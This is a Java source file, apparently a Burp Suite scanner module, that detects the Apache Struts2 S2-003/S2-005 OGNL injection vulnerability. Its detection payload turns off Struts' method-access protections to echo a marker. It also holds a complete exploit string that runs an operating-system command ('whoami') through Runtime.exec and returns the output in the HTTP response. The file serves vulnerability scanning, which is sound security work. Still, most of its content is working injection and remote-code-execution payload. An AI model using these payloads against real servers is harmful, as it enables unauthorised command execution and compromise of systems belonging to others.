package module.java.vul;

import burp.*;
import module.Util;

import java.net.URLEncoder;
import java.util.Arrays;

public class S2_003_005 extends IModule {
    public String randomMark = Util.getRandomString(16);
    public String[] injectMark = new String[]{randomMark.substring(0, 9), randomMark.substring(9, 16)};
    public String poc =
        "(a)(('\\u0023_memberAccess.allowStaticMethodAccess\\u003dtrue')(a))" +
        "&(b)(('\\u0023context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\u003dfalse')(b))" +
        "&(c)(('\\u0023_memberAccess.excludeProperties\\u003d@java.util.Collections@EMPTY_SET')(c))" +
        "&(d)(('\\u0023xman\\u003d@org.apache.struts2.ServletActionContext@getResponse()')(d))" +
        "&(e)(('\\u0023xman.getWriter().print(\"" + injectMark[0] + "\")')(e))" +
        "&(f)(('\\u0023xman.getWriter().print(\"" + injectMark[1] + "\")')(f))" +
        "&(g)(('\\u0023xman.getWriter().flush()')(g))" +
        "&(h)(('\\u0023xman.getWriter().close()')(h))";
    public String exp =
        "(a)(('\\u0023_memberAccess.allowStaticMethodAccess\\u003dtrue')(a))" +
        "&(b)(('\\u0023context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\u003dfalse')(b))" +
        "&(c)(('\\u0023_memberAccess.excludeProperties\\u003d@java.util.Collections@EMPTY_SET')(c))" +
        "&(d)(('\\u0023mycmd\\u003d\\'whoami\\'')(d))" +
        "&(e)(('\\u0023myret\\u003d@java.lang.Runtime@getRuntime().exec(\\u0023mycmd)')(e))" +
        "&(f)(('\\u0023mydat\\u003dnew\\u0020java.io.DataInputStream(\\u0023myret.getInputStream())')(f))" +
        "&(g)(('\\u0023myres\\u003dnew\\u0020byte[51020]')(g))" +
        "&(h)(('\\u0023mydat.readFully(\\u0023myres)')(h))" +
        "&(i)(('\\u0023mystr\\u003dnew\\u0020java.lang.String(\\u0023myres)')(i))" +
        "&(j)(('\\u0023myout\\u003d@org.apache.struts2.ServletActionContext@getResponse()')(j))" +
        "&(k)(('\\u0023myout.getWriter().print(\\u0023mystr)')(k))";

    @Override
    public IScanIssue start() {
        IHttpService httpService = iHttpRequestResponse.getHttpService();
        IRequestInfo requestInfo = helpers.analyzeRequest(iHttpRequestResponse);
        byte[] request = iHttpRequestResponse.getRequest();
        String[] parameterNames = poc.split("&");

        byte in = (byte) 0;
        if (requestInfo.getMethod().equals("POST")) {
            in = (byte) 1;
        }
        byte[] newRequest = request;
        for (String parameterName: parameterNames) {
            IParameter newParameter = helpers.buildParameter(URLEncoder.encode(parameterName), "1", in);
            newRequest = helpers.updateParameter(newRequest, newParameter);
        }

        IHttpRequestResponse newHttpRequestResponse = callbacks.makeHttpRequest(httpService, newRequest);
        byte[] response = newHttpRequestResponse.getResponse();
        IResponseInfo newResponseInfo = helpers.analyzeResponse(response);
        byte[] body = Arrays.copyOfRange(response, newResponseInfo.getBodyOffset(), response.length);
        String bodyText = new String(body);
        if (bodyText.contains(randomMark)) {
            this.iHttpRequestResponse = newHttpRequestResponse;
            this.detail = URLEncoder.encode(exp);
            return creatCustomScanIssue();
        }
        return null;
    }
}
